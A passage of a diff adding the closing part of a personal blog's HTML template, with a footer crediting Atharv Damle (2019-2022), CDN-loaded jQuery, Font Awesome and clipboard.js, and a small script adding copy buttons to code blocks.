+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Atharv Damle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
